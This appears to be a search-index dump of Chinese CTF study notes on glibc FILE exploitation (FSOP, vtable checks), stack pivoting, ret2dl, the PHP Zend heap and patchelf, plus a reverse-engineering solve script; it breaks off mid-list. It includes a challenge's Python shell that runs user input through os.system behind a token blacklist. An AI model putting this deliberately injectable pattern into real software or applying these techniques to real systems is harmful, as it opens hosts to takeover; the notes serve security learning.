\"]},\"417\":{\"h\":\"调试\",\"t\":[\"image-20240327013056474\",\"_io_new_file_init_internal函数\",\"void _IO_new_file_init_internal(struct _IO_FILE_plus *fp) { /* POSIX.1 allows another file handle to be used to change the position of our file descriptor. Hence we actually don't know the actual position before we do the first fseek (and until a following fflush). */ fp->file._offset = _IO_pos_BAD; fp->file._flags |= CLOSED_FILEBUF_FLAGS; _IO_link_in(fp); fp->file._fileno = -1; // 设置_fileno -1 } \",\"image-20240327014215956\",\"_IO_link_in\",\"void _IO_link_in(struct _IO_FILE_plus *fp) { if ((fp->file._flags & _IO_LINKED) == 0) { fp->file._flags |= _IO_LINKED; // ... fp->file._chain = (FILE *)_IO_list_all; _IO_list_all = fp; // ... } } \",\"变化\",\"image-20240327014539222\",\"_chain链接_IO_2_1_stderr\",\"_lock 修改值\",\"_wide_data修改值\",\"查看list_all链\",\"可以发现和我们的fp一模一样 所以我们的_IO_list_all此时是指向的我们fp\",\"image-20240327015022273\",\"查看_IO_2_1_stderr_\",\"可以发现_chain是指向的其他file 所以此时整条链是 _IO_list_all->fp 然后后面的通过_chain链接起来\",\"image-20240327015201921\"]},\"418\":{\"h\":\"打开文件\"},\"419\":{\"h\":\"源码\",\"t\":[\"if (_IO_file_fopen((FILE *)new_f, filename, mode, is32) != NULL) return __fopen_maybe_mmap(&new_f->fp.file); \"]},\"420\":{\"h\":\"调试\",\"t\":[\"image-20240327015402527\",\"_io_file_fopen函数 太长了 主要就是判断打开模式 然后调用 io_file_open函数来打开\",\"image-20240327020322439\",\"_io_file_open函数 最终调用open 去打开文件\",\"image-20240327020501416\",\"fp 变化\",\"_fileno 变成对应的文件描述符了\",\"_offset变为了-1\",\"image-20240327020644254\"]},\"421\":{\"h\":\"FSOP细读\",\"t\":[\"io_file中经典利用 核心L_IO_flush_all_lockp函数的利用\"]},\"422\":{\"h\":\"利用条件\",\"t\":[\"知道libc基地址\",\"_IO_list_all 是作为全局变量储存在 libc.so 中的\"]},\"423\":{\"h\":\"_IO_flush_all_lockp(libc 2.23)\",\"t\":[\"三种情况下会被自动触发:\",\"当 libc 执行 abort 流程时\",\"当执行 exit 函数时\",\"当执行流从 main 函数返回时\"]},\"424\":{\"h\":\"获取fp\",\"t\":[\"image-20240328105659625\"]},\"425\":{\"h\":\"所有的文件流\",\"t\":[\"我们主要的利用都是这里 所以重点分析这里\",\"image-20240328105736546\"]},\"426\":{\"h\":\"条件\",\"t\":[\"我们可以发现这里的条件主要是两部分\",\"(fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base) || (_IO_vtable_offset(fp) == 0 && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)) \",\"第一部分\",\"fp->_mode <= 0 表示文件不可写\",\"fp->_IO_write_ptr > fp->_IO_write_base\",\"当数据写入缓冲区的时候 IO_write_ptr会逐渐增加 指向下一个可用的位置\",\"IO_write_base 是缓冲区起始位置\",\"第二部分\",\"_IO_vtable_offset(fp) == 0 虚表偏移量为0 也就是标准文件流\",\"fp->_mode > 0 文件可写\",\"(fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base) 宽字符数据的写入缓冲区中有待写入的数据\"]},\"427\":{\"h\":\"libc2.24 防御机制\",\"t\":[\"2.24之下多了 IO_validate_vtable和_IO_vtable_check两大函数\"]},\"428\":{\"h\":\"IO_validate_vtable\",\"t\":[\"这个函数主要是检测了你的vtable是否在合法区域范围之内（__libc_IO_vtables）\",\"// 验证虚表指针 如果验证失败则中止进程 static inline const struct _IO_jump_t * IO_validate_vtable (const struct _IO_jump_t *vtable) { /* Fast path: The vtable pointer is within the __libc_IO_vtables section. */ // 虚函数表指针在__libc_IO_vtables部分内 uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables; // 获取vtable const char *ptr = (const char *) vtable; // 查看offset是否在这个区间范围之内 uintptr_t offset = ptr - __start___libc_IO_vtables; if (__glibc_unlikely (offset >= section_length)) /* The vtable pointer is not in the expected section. Use the slow path, which will terminate the process if necessary. */ _IO_vtable_check (); return vtable; } \"]},\"429\":{\"h\":\"libc2.24 IO_file利用\",\"t\":[\"由于已经对vtable进行了限制 我们可以另外再想办法 比如对scanf等函数进行操作\"]},\"430\":{\"h\":\"小知识点\",\"t\":[\"_IO_buf_base 表示操作的起始地址\",\"_IO_buf_end 表示结束地址\"]},\"431\":{\"h\":\"对_IO_buf_base进行劫持\",\"t\":[\"这里用wiki中提供的代码进行调试理解\",\"#include \\\"stdio.h\\\" char buf[100]; int main() { char stack_buf[100]; scanf(\\\"%s\\\",stack_buf); scanf(\\\"%s\\\",stack_buf); } \",\"没调用scanf之前\",\"image-20240421003231028\",\"调用scanf后\",\"image-20240421154819197\",\"这样可能不方便观察 我们带符号打印一下\",\"image-20240421154901421\",\"可以发现_IO_buf_base和 _IO_buf_end被赋值 分别是缓冲区chunk的开头和末尾 那么我们如果可以劫持这两个 修改这两个值就可以实现任意地址的修改\"]},\"432\":{\"h\":\"Socket通讯\",\"t\":[\"因为很久以前就知道了沙盒可以使用socket通讯进行传输程序 但是其实一直没有深度了解一下 只是大概知道有这么一个东西 现在仔细了解一下顺便把udp tcp等东西再进行了解一下\",\"参考文章:socket通讯原理及例程（一看就懂）-腾讯云开发者社区-腾讯云 (tencent.com)\",\"(3 封私信 / 38 条消息) TCP和Udp的区别是什么？ - 知乎 (zhihu.com)\"]},\"433\":{\"h\":\"TCP/IP UDP\",\"t\":[\"udp(user data protocol 用户数据协议)属于TCP/IP协议的家族 这里放原文中的图 很方便理解\",\"这里写图片描述\",\"然后这里涉及到了udp和tcp 这就不得不去提及一下那一张很生草但是又形象的图了\",\"img\",\"我们可以从图中大概知道 tcp是面对连接的传输层协议 传输数据之前都是必须创建链接的 tcp是一对一的两点服务 tcp是有序号的 并且在进行传输的时候比如我发送了一个数据过去 对面会返回我已经收到 所以我们可以清楚的知道哪些数据是成功收到的哪些数据是失败的 这样我们就可以针对失败的数据重发包\",\"udp是不需要链接的 可以一对多 多对多\",\"tcp的开销较大 因为首部长度在无选项的时候是20字节 所以还会更长 而udp是固定的8字节\"]},\"434\":{\"h\":\"socket的加入\",\"t\":[\"这里也是放原文的图 Socket是应用层与TCP/IP协议族通信的中间软件抽象层，它是一组接口\",\"socket是传输层的协议\",\"这里写图片描述\",\"socket的存在将大量的复杂网络通讯协议等隐藏了起来 我们主要是针对socket提供的接口进行一个调用\"]},\"435\":{\"h\":\"WEBsocket\",\"t\":[\"websocket是通过模仿socket协议产生的 我们只需要关心我们监听了什么端口然后调用read函数返回了什么数据 我们如何处理数据以及怎么把数据返还回去 但是值得注意的是websocket是应用层协议而socket就是上文讲述的是传输层的协议\",\"websocket是建立在TCP协议之上的 我们需要进行TCP的三次握手 但是到了真正传输的时候是不需要HTTP传输的\",\"WebSocket 是类似 Socket 的 TCP 长连接的通讯模式\"]},\"436\":{\"h\":\"php pwn学习\",\"t\":[\"学习文章:PHP堆开发简介 (deepunk.icu)\",\"[第5章 内存管理 - 5.1 Zend内存池 - 《试读] PHP7内核剖析》 - 书栈网 · BookStack\"]},\"437\":{\"h\":\"php扩展学习\",\"t\":[\"参考文章:[PHP pwn环境搭建+so文件的调试 | Pwn进你的心 (ywhkkx.github.io)](https://ywhkkx.github.io/2022/07/06/PHP pwn环境搭建+so文件的调试/)\",\"[第7章 扩展开发 - 7.2 扩展的实现原理 - 《试读] PHP7内核剖析》 - 书栈网 · BookStack\"]},\"438\":{\"h\":\"heap相关学习\",\"t\":[\"zend_alloc\",\"分为三种大小\",\"zend_mm_alloc_small (小于3/4的2mb) \",\"内存中提前分配了30相同大小的内存slot 分配在不同的page上\",\"如果大小合适会直接从这三十个slot中分配\",\"zend_mm_alloc_large (大于2mb小于4k)\",\"zend_mm_alloc_huge (小于2mb) \",\"单链表\",\"实际通过zend_mm_chunk_alloc分配\",\"一个chunk 2mb 包含512 page\",\"除了huge chunk chunk中第一页有这个结构体记录chunk的信息\",\"_zend_mm_heap是内存池的一个结构 用于管理small large huge的分配\",\"Zend中只有一个heap结构。\",\"struct _zend_mm_heap { #if ZEND_MM_STAT size_t size; //当前已用内存数 size_t peak; //内存单次申请的峰值 #endif zend_mm_free_slot *free_slot[ZEND_MM_BINS]; // 小内存分配的可用位置链表，ZEND_MM_BINS等于30，即此数组表示的是各种大小内存对应的链表头部 ... zend_mm_huge_list *huge_list; //大内存链表 zend_mm_chunk *main_chunk; //指向chunk链表头部 zend_mm_chunk *cached_chunks; //缓存的chunk链表 int chunks_count; //已分配chunk数 int peak_chunks_count; //当前request使用chunk峰值 int cached_chunks_count; //缓存的chunk数 double avg_chunks_count; //chunk使用均值，每次请求结束后会根据peak_chunks_count重新计算：(avg_chunks_count+peak_chunks_count)/2.0 } struct _zend_mm_chunk { zend_mm_heap *heap; //指向heap zend_mm_chunk *next; //指向下一个chunk zend_mm_chunk *prev; //指向上一个chunk int free_pages; //当前chunk的剩余page数 int free_tail; /* number of free pages at the end of chunk */ int num; char reserve[64 - (sizeof(void*) * 3 + sizeof(int) * 3)]; zend_mm_heap heap_slot; //heap结构，只有主chunk会用到 zend_mm_page_map free_map; //标识各page是否已分配的bitmap数组，总大小512bit，对应page总数，每个page占一个bit位 zend_mm_page_info map[ZEND_MM_PAGES]; //各page的信息：当前page使用类型(用于large分配还是small)、占用的page数等 }; //按固定大小切好的small内存槽 struct _zend_mm_free_slot { zend_mm_free_slot *next_free_slot;//此指针只有内存未分配时用到，分配后整个结构体转为char使用 }; \",\"直接从文中抠出来的图 特别详细和好理解\",\"img\"]},\"439\":{\"h\":\"small malloc and free\",\"t\":[\"static zend_always_inline void *zend_mm_alloc_small(zend_mm_heap *heap, int bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC) { #if ZEND_MM_STAT do { size_t size = heap->size + bin_data_size[bin_num]; size_t peak = MAX(heap->peak, size); heap->size = size; heap->peak = peak; } while (0); #endif if (EXPECTED(heap->free_slot[bin_num] != NULL)) { zend_mm_free_slot *p = heap->free_slot[bin_num]; heap->free_slot[bin_num] = p->next_free_slot; return p; } else { return zend_mm_alloc_small_slow(heap, bin_num ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC); } } static zend_always_inline void zend_mm_free_small(zend_mm_heap *heap, void *ptr, int bin_num) { zend_mm_free_slot *p; #if ZEND_MM_STAT heap->size -= bin_data_size[bin_num]; #endif #if ZEND_DEBUG do { zend_mm_debug_info *dbg = (zend_mm_debug_info*)((char*)ptr + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(sizeof(zend_mm_debug_info))); dbg->size = 0; } while (0); #endif p = (zend_mm_free_slot*)ptr; p->next_free_slot = heap->free_slot[bin_num]; heap->free_slot[bin_num] = p; } \"]},\"440\":{\"h\":\"调试\",\"t\":[\"image-20240428113615977\",\"每次emalloc下来的small chunk都是fd链中一条\",\"间距0x280\",\"image-20240428113701938\",\"依次向右取值\"]},\"441\":{\"h\":\"malloc\",\"t\":[\"static zend_always_inline void *zend_mm_alloc_small(zend_mm_heap *heap, int bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC) { #if ZEND_MM_STAT do { size_t size = heap->size + bin_data_size[bin_num]; size_t peak = MAX(heap->peak, size); heap->size = size; heap->peak = peak; } while (0); #endif if (EXPECTED(heap->free_slot[bin_num] != NULL)) { zend_mm_free_slot *p = heap->free_slot[bin_num]; heap->free_slot[bin_num] = p->next_free_slot; return p; } else { return zend_mm_alloc_small_slow(heap, bin_num ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC); } } \",\"会优先取 free_slot里面 头 \",\"然后将free_slot[bin_num]指向下一个free slot\"]},\"442\":{\"h\":\"free\",\"t\":[\"static zend_always_inline void zend_mm_free_small(zend_mm_heap *heap, void *ptr, int bin_num) { zend_mm_free_slot *p; #if ZEND_MM_STAT heap->size -= bin_data_size[bin_num]; #endif #if ZEND_DEBUG do { zend_mm_debug_info *dbg = (zend_mm_debug_info*)((char*)ptr + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(sizeof(zend_mm_debug_info))); dbg->size = 0; } while (0); #endif p = (zend_mm_free_slot*)ptr; p->next_free_slot = heap->free_slot[bin_num]; heap->free_slot[bin_num] = p; } \",\"直接就是入链头部没什么好说的（\"]},\"443\":{\"h\":\"8byte（简单栈迁移）\"},\"444\":{\"h\":\"栈迁移\",\"t\":[\"这里好好学一下栈迁移这个知识点 确实重要 因为已经遇到了很多次了\"]},\"445\":{\"h\":\"栈迁移的大致操作\",\"t\":[\"通过将ebp覆盖成构造的fake_ebp ，再利用leave_ret这个gadget将esp劫持到fake_ebp的地址上。\",\"这里写个小插曲 因为大多数时候我都是去ida直接找的这个gadget 但是好像可以用命令行来解决这个问题比如我们这里用指令\",\"$ ROPgadget --binary pwn --only \\\"leave|ret\\\" \"]},\"446\":{\"h\":\"栈迁移核心\",\"t\":[\"因为我们常使用leave_ret gadget链来实现\",\" leave指令\",\"首先是依靠这个指令来实现把rbp寄存器值变为我们希望的一个地址 这样就可以实现栈的移动\",\"这里说一下我自己的浅薄理解 因为我们使用的栈其实本质就是基于rbp/rsp定位的 所以我们只需要把寄存器的值改变就实现了栈迁移 新的fake 地址后面的内容会被当成栈\",\"那么这个指令的本质:\",\"mov esp,ebp; pop ebp; \",\"ret 指令\",\"pop eip \",\"那么下面是实现原理图\",\"原理\",\"这里是执行mov esp ,ebp;这个操作之前的栈结构 我们在ebp这个位置放入我们我们希望这个栈最终落脚点 然后就会执行\",\"​ \",\"这里就是pop ebp;这个操作 因为 pop操作我们的rsp向下移动一格 ebp寄存器 存入fake_ebp1_addr\",\"然后执行指令ret--> pop eip; 这个指令 那么同理 rsp向下移动一格 eip存入我们的read_plt\",\"这里需要注意eip这个寄存器很特殊 这个寄存器是存入的我们下一条执行的指令地址 所以当执行完ret后整个程序流程就跑到了read_plt这里\",\"那么 到现在我们就可以理清楚了核心需要实现的部分:\",\"将rbp寄存器改值 ---- >栈迁移\",\"将rip寄存器改值 ------ >劫持程序流程\",\"换句话说 我们只要能够实现这两个部分就可以了\",\"接下来我们需要理解 栈的指针寄存器:rsp 还任然留在了原地 以及最容易理解错的是 当我们执行read函数的时候 程序会自动保存下一个指令的地址 这是函数的调用约定所以当我们执行完后read函数后 我们来到了leave_ret指令的地方\",\"此时我们rsp = rbp 那么我们的rsp也成功完成了迁移工作 来到了 fake_ebp的地方\",\"然后 把fake_ebp2的地址给了rbp rsp向下跑一下\",\"原理3\",\"所以这里我们是需要构造第二个fake_ebp的\",\"然后我们就成功完成了一次栈迁移\"]},\"447\":{\"h\":\"ret2dl\"},\"448\":{\"h\":\"部分前置知识讲解\"},\"449\":{\"h\":\"got表和plt表详细解说\",\"t\":[\"这里我们不对plt和got表内详细内容进行介绍了 需要了解的参考这个文章:深入窥探动态链接 - 知乎 (zhihu.com)我们主要探讨在第一次数据绑定的时候 我们程序究竟是怎么运行的 我们假设我们的函数在plt[1]的地方\",\"运行PLT[1]\",\"由于我是是第一次的调用 所以GOT[3]的内容为:PLT[1]中push reloc_arg;指令的地址 也就是会执行push reloc_arg 和jmp plt[0]自动跳转PLT[0]去完成绑定 并且 将reloc_arg参数作为参数这里PLT[N]与GOT[2+N]一 一对应\",\"jmp [GOT[3]]; push reloc_arg; jmp PLT[0]; \",\"运行PLT[0]\",\"这里相当于_dl_runtime_resolve(link_map,reloc_arg)\",\"push [GOT[1]]; // 1存的就是link_map jmp [GOT[2]]; // 2存的是_dl_runtime_resolve函数 \",\"_dl_runtime_resolve函数\",\"这里写了一个大概的源码 方便我们了解 大概就是调用_dl_fixup然后这个函数将真实的地址返回给rax寄存器 最后我们jmp过去 实现函数调用\",\"# _dl_runtime_resolve 示例 - x86_64 汇编 # # 注意：这是一个简化的示例，用于说明目的。 # 实际实现会根据系统的动态链接器的具体需求和优化而有所不同。 .global _dl_runtime_resolve .type _dl_runtime_resolve, @function _dl_runtime_resolve: # 保存寄存器，因为这些寄存器会在 _dl_fixup 中被使用 pushq %rax # 保存原始的返回地址 pushq %rcx # 保存第一个参数 pushq %rdx # 保存第二个参数 # 传递 _dl_runtime_resolve 的参数给 _dl_fixup # 第一个参数（通常是符号索引）在 %rdi 中 # 第二个参数（返回地址）现在在栈顶 movq (%rsp), %rsi # 将返回地址移动到 %rsi # 调用 _dl_fixup 来解析符号地址 # _dl_fixup(符号索引, 返回地址) call _dl_fixup # _dl_fixup 返回解析后的函数地址在 %rax 中 # 恢复寄存器 popq %rdx # 恢复第二个参数 popq %rcx # 恢复第一个参数 popq %rax # 恢复原始的返回地址 # 使用解析后的地址跳转执行目标函数 # 这里我们假设解析后的地址已经由 _dl_fixup 放入 %rax 中 jmp *%rax # _dl_fixup 函数的伪声明，需要实际实现 .type _dl_fixup, @function _dl_fixup: # 实际的 _dl_fixup 实现会在这里 ret \"]},\"450\":{\"h\":\"_dl_runtime_resolve部分详细解说\",\"t\":[\"参考文章:深入理解-dl_runtime_resolve - unr4v31 - 博客园 (cnblogs.com)\",\"_dl_runtime_resolve(link_map_obj, reloc_index) \"]},\"451\":{\"h\":\"reloc_index\",\"t\":[\"省略点将 我们可以通过reloc_index知道我们要绑定函数的名字 其获取逻辑是:\",\"elf_rel = rel_plt[reloc_index]; r_info = elf_rel.r_info; elf_sym = *(r_info); st_name = elf.sym.st_name; // 这里的function_name就是我们需要的函数名了 function_name = dynstr[st_name]; \",\"这个参数 可以粗俗得当作一个属于.rel.plt这个数组的下标 就像是: .rel.plt[reloc_index]\",\"type ELF_Rel struct { r_offset int64 r_info int } rel.plt = []Elf_Rel{} \",\"r_offset: 存储 我们需要修改的plt条目的位置 相当于是告诉我们PLT[N]中的这个N 但是其实这里r_offset是一个绝对地址 相当于:&PLT[N]\",\"r_info高位3字节 用来表示 .dynsym这个数组的下标 也就是.dynsym[r_info]\",\"然后.dynsym[r_info].st_name获取我们需要的函数名字在.dynstr数组中的下标 然后我们就可以通过.dynstr[st_name]来获取名字了\",\"所以总结一下:\",\".dynstr存函数名字\",\".dynsym存函数名字在.dynstr中的位置\",\".rel_plt存我们需要.dynsym中哪个结构体 方便我们取出名字\"]},\"452\":{\"h\":\"记一次patchelf的使用+浅理解ld和libc\",\"t\":[\"每次去使用xclibc的时候 都不是特别好使hhh 所以就重新了解一下patchelf的使用参考文章:linux动态链接库的加载顺序_动态链接库顺序-CSDN博客和man ld.so 的翻译_ld-linux.so的man手册-CSDN博客获取程序寻找libc的顺序[转] Linux下程序的加载、运行和终止流程 - JollyWing - 博客园 (cnblogs.com)获取linux加载程序的流程\"]},\"453\":{\"h\":\"程序寻找libc的顺序\",\"t\":[\"这里主要是学习一下程序在查找libc的时候的顺序 方便我们理解我们patchelf要修改哪些东西\",\"优先寻找dt_runpath 如果不存在dt_runpath再去寻找dt_rpath\",\"runpath会ld忽略ld_library_path所以当程序由runpath后我们就算修改ld_libary_path也不会起效果\",\"然后就是寻找ld_libary_path\",\"还有个和这个很相似的变量:libray_path这个变量是程序编译期间查找动态链接库时指定查找共享库的路径 也就是动态共享库的路径 所以说这个变量是开发的时候编译使用 为了让编译器能够找到对应的动态库ld_libary_path程序加载运行期间查找动态链接库的路径（系统默认系统之前查找）\",\"从路径:/etc/ld.so.scache中查找文件\",\"从/lib寻找\",\"从/usr/lib中寻找\"]},\"454\":{\"h\":\"linux程序加载简化流程\",\"t\":[\"执行exec(3)系统调用\",\"陷入系统内核操作 由操作系统加载该文件 内存映射将文件加载到内存中\",\"如果文件头中存在pt_interp那么就会将ld找到 并且映射进入内存 然后准备对应环境 将控制权移交给ld、\",\"ld的作用\",\"解析依赖：动态链接器检查程序的头部，找出程序依赖的所有共享库。\",\"加载共享库：动态链接器查找这些共享库的位置，并将它们加载到内存中。\",\"符号解析：动态链接器解析程序中的符号引用，确保它们指向正确的地址。\"]},\"455\":{\"h\":\"查看程序当前信息\",\"t\":[\"获取目前程序的ld和libc的路径信息\",\"ldd file_name \",\"可以得到libc.so.6的当前绑定地址\",\"ld当前绑定地址\",\"ldd --version \",\"可以查看当前libc和ld的版本\"]},\"456\":{\"h\":\"修改程序的 ld 和 libc 地址\",\"t\":[\"修改ld的地址\",\"patchelf --set-interpreter ld_addr file_name \",\"修改libc的地址\",\"这里old_libc就是ldd查到的那个ld地址(==>之前)比如:libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 那么就是libc.so.6\",\"patchelf --replace-needed old_libc new_libc file_name \",\"修改Libc的地址(不太稳定)\",\"patchelf --set-rpath new_rpath your_file \"]},\"457\":{\"h\":\"HgameWeek2Babyre\",\"t\":[\"看上去应该是简单的hh\"]},\"458\":{\"h\":\"解释部分函数\",\"t\":[\"pthread_create 函数 看名字就应该差不多能推断出来是一个线程创建函数\",\"int pthread_create(pthread_t *thread, const pthread_attr_t *attr, void *(*start_routine) (void *), void *arg); \",\"thread: 指向 pthread_t 变量的指针，函数成功完成时，这个变量将被填充为新创建线程的线程ID。\",\"attr: 指向 pthread_attr_t 结构体的指针，该结构体指定了新线程的属性。如果此值为 NULL，则使用默认属性创建线程。\",\"start_routine: 指向将由新线程执行的函数的函数指针。这个函数必须返回一个 void * 并且接受一个 void * 参数。\",\"arg: 指向将被传递给 start_routine 函数的参数的指针。\",\"函数在成功时返回 0，在失败时返回非零错误编号。\",\"pthread_join 函数是 POSIX 线程库（pthreads）中的一个函数，用于等待指定的线程结束。\",\"当一个线程结束时，它的资源不会立即被操作系统回收，直到其他线程对其进行了回收操作。pthread_join 函数允许一个线程等待另一个线程结束，并回收其资源，类似于进程中的 wait 系统调用。\",\"#include <pthread.h> int pthread_join(pthread_t thread, void **retval); \",\"thread: 要等待的线程标识符，是调用 pthread_create 时创建线程的返回值。\",\"retval: 指向一个指针的指针，用于接收被等待线程的退出状态。如果不关心退出状态，可以传递 NULL。\"]},\"459\":{\"h\":\"正式做题\",\"t\":[\"先大概把类型改改 把变量名字改改\",\"__int64 __fastcall main(__int64 a1, char **a2, char **a3) { int i; // [rsp+0h] [rbp-40h] int j; // [rsp+4h] [rbp-3Ch] pthread_t newthread; // [rsp+10h] [rbp-30h] BYREF pthread_t v7; // [rsp+18h] [rbp-28h] BYREF pthread_t v8; // [rsp+20h] [rbp-20h] BYREF pthread_t v9[3]; // [rsp+28h] [rbp-18h] BYREF v9[2] = __readfsqword(0x28u); get_input(); if ( !__sigsetjmp(env, 1) ) { signal(8, (__sighandler_t)handler); for ( i = 0; i <= 5; ++i ) *((_BYTE *)&value + i) ^= 0x11u; } sem_init(&sem, 0, 1u); sem_init(&stru_557BBE9C2280, 0, 0); sem_init(&stru_557BBE9C22A0, 0, 0); sem_init(&stru_557BBE9C22C0, 0, 0); pthread_create(&newthread, 0LL, (void *(*)(void *))dest0, 0LL); pthread_create(&v7, 0LL, dest1, 0LL); pthread_create(&v8, 0LL, dest2, 0LL); pthread_create(v9, 0LL, dest3, 0LL); for ( j = 0; j <= 3; ++j ) pthread_join(*(&newthread + j), 0LL); sub_557BBE9BF803(); return 0LL; } \"]},\"460\":{\"h\":\"流程\",\"t\":[\"先是get我们的输入 然后在我们输入最后的位置加入249数据\",\"对value变量xor 我们点入value变量 查看相关引用 发现主要用在加密input上面 并且发现下面这个函数 说明初始值是feifei\",\"void sub_557BBE9BF2E9() { strcpy((char *)&value, \\\"feifei\\\"); } \",\"然后分别开启四个函数 并发开启\",\"几乎每个函数都是长这个样子的 我们猜测是每个函数要等待上一个函数执行完毕再执行\",\"真实情况我们以动调为标准\",\"void __fastcall __noreturn dest0(void *a1) { while ( 1 ) { sem_wait(&sem); if ( n > 31 ) break; input[n] += *((char *)&value + (n + 1) % 6) * input[n + 1]; ++n; sem_post(&stru_557BBE9C2280); } sem_post(&stru_557BBE9C2280); pthread_exit(0LL); } \",\"最后就是检查input是否为flag了\"]},\"461\":{\"h\":\"动调\",\"t\":[\"由于这题涉及多线程 所以我们就在每个加密函数里面打idapython的脚本 来看看对应函数运行的时候n的值\",\"import idc print(\\\"dest 0 n:\\\",idc.get_reg_value(\\\"eax\\\")) \",\"类似于这样 也就是在dest函数下面写入对应的脚本 来看看运行的顺序\",\"dest 0 n: 0 dest 1 n: 1 dest 2 n: 2 dest 3 n: 3 dest 0 n: 4 dest 1 n: 5 dest 2 n: 6 dest 3 n: 7 dest 0 n: 8 dest 1 n: 9 dest 2 n: 10 dest 3 n: 11 dest 0 n: 12 dest 1 n: 13 dest 2 n: 14 dest 3 n: 15 dest 0 n: 16 dest 1 n: 17 dest 2 n: 18 dest 3 n: 19 dest 0 n: 20 dest 1 n: 21 dest 2 n: 22 dest 3 n: 23 dest 0 n: 24 dest 1 n: 25 dest 2 n: 26 dest 3 n: 27 dest 0 n: 28 dest 1 n: 29 dest 2 n: 30 dest 3 n: 31 dest 0 n: 32 dest 1 n: 32 dest 2 n: 32 dest 3 n: 32 \",\"以及value的部分\",\"get_input(); if ( !__sigsetjmp(env, 1) ) { signal(8, (__sighandler_t)handler); for ( i = 0; i <= 5; ++i ) *((_BYTE *)&value + i) ^= 0x11u; } \",\"这里我们动调发现value的值在xor第三次的时候就终止了 所以参与下面加密函数的value值为:\",\"char value[6] = { 0x77, 0x74, 0x78, 0x66, 0x65, 0x69 }; \"]},\"462\":{\"h\":\"脚本\",\"t\":[\"流程知道了 反调试知道了 现在提取flag数据进行解密\",\"#include <stdio.h> char value[6] = { 0x77, 0x74, 0x78, 0x66, 0x65, 0x69}; unsigned int flag[33] = { 0x00002F14, 0x0000004E, 0x00004FF3, 0x0000006D, 0x000032D8, 0x0000006D, 0x00006B4B, 0xFFFFFF92, 0x0000264F, 0x0000005B, 0x000052FB, 0xFFFFFF9C, 0x00002B71, 0x00000014, 0x00002A6F, 0xFFFFFF95, 0x000028FA, 0x0000001D, 0x00002989, 0xFFFFFF9B, 0x000028B4, 0x0000004E, 0x00004506, 0xFFFFFFDA, 0x0000177B, 0xFFFFFFFC, 0x000040CE, 0x0000007D, 0x000029E3, 0x0000000F, 0x00001F11, 0x000000FF, 0xFA}; void dest3(int n) { printf(\\\"dest3 n:%d\\\\n\\\", n); flag[n] ^= flag[n + 1] - value[(n + 1) % 6]; } void dest2(int n) { printf(\\\"dest2 n:%d\\\\n\\\", n); flag[n] /= flag[n + 1] + value[(n + 1) % 6]; } void dest1(int n) { printf(\\\"dest1 n:%d\\\\n\\\", n); flag[n] += value[(n + 1) % 6] ^ flag[n + 1]; } void dest0(int n) { printf(\\\"dest0 n:%d\\\\n\\\", n); flag[n] -= value[(n + 1) % 6] * flag[n + 1]; } int main() { printf(\\\"test\\\"); for (int i = 31; i >= 0; i--) { switch (i % 4) { case 3: dest3(i); break; case 2: dest2(i); break; case 1: dest1(i); break; case 0: dest0(i); break; default: break; } /* code */ } printf(\\\"\\\\nOutput:\\\\n\\\"); for (int i = 0; i < 32; i++) { printf(\\\"%c\\\", flag[i]); /* code */ } } \"]},\"463\":{\"h\":\"nc签到题(常用指令绕过)\",\"t\":[\"第一次拿到这个附件 丢进ida里面没用 后缀改为.zip 也没有看见什么东西 一筹莫展 拿这玩意丢进虚拟机里面跑了一下 发现了import无效指令 所以才改后缀为py 才看见代码\",\"import os art = ''' (( \\\"####@@!!$$ )) `#####@@!$$` )) (( '####@!!$: (( ,####@!!$: )) .###@!!$: `##@@!$: `#@!!$ !@# `#@!$: @#$ #$ `#@!$: !@! '@!$: '`\\\\ \\\"!$: /`' '\\\\ '!: /' \\\"\\\\ : /\\\" -.\\\"-/\\\\\\\\\\\\-.\\\"//.-\\\"/:`\\\\.\\\"-.JrS\\\".\\\"-=_\\\\\\\\ \\\" -.\\\"-.\\\\\\\\\\\"-.\\\"//.-\\\".`-.\\\"_\\\\\\\\-.\\\".-\\\\\\\".-//''' print(art) print(\\\"My_shell_ProVersion\\\") blacklist = ['cat','ls',' ','cd','echo','<','${IFS}'] while True: command = input() for i in blacklist: if i in command: exit(0) os.system(command) \"]},\"464\":{\"h\":\"linux中常用的指令\",\"t\":[\"1、cat命令—用于将文件内容输出到终端上，经常使用于查看文本文件的内容。\",\"2、less命令—用于分页查看文件内容，可以向上翻页、向下翻页、搜索关键字等，合适查看大文件。\",\"less [options] file_name \",\"options: \",\"-N 或 --LINE-NUMBERS：显示每行的行号。\",\"-S 或 --chop-long-lines：不折行长行。默认情况下，less 会折行显示超出屏幕宽度的长行。使用此选项后，长行将不会被折行，而是横向滚动显示。\",\"-M 或 --LONG-PROMPT：显示更详细的提示信息，包括文件的百分比位置等。\",\"-i 或 --ignore-case：在搜索时忽略大小写。默认情况下，less 的搜索是区分大小写的。\",\"-g 或 --hilite-search：仅高亮显示最后一次搜索匹配的字符串。\",\"-E 或 --QUIT-AT-EOF：在到达文件末尾时自动退出。\",\"-m 或 --LONG-PROMPT：显示百分比表示的文件位置。\",\"-R 或 --RAW-CONTROL-CHARS：显示控制字符（如颜色代码）。\",\"-X 或 --no-init：不清空屏幕。在退出 less 时，屏幕上显示的文本不会被清除。\",\"-F 或 --quit-if-one-screen：如果文件内容能够在一屏内显示完毕，则自动退出 less。\",\"-? 或 --help：显示帮助信息。\",\"键盘操作:\",\"Space 或 f：向下滚动一页。\",\"b：向上滚动一页。\",\"Arrow keys：逐行滚动。\",\"/：向下搜索字符串。\",\"?：向上搜索字符串。\",\"n：重复上一次搜索（向下）。\",\"N：重复上一次搜索（向上）。\",\"q：退出 less。\",\"3、more命令—与less类似，也是用于分页查看文件内容，但是功能较少，只能向下翻页。\",\"more [options] file_name \",\"4、head命令—用于查看文件的前几行内容，默许情况下显示前10行。\",\"head [options] [file...] \",\"其中，[file...] 是一个或多个文件名。如果没有指定文件，或者文件名为 -，head 会从标准输入读取数据。\",\"-n 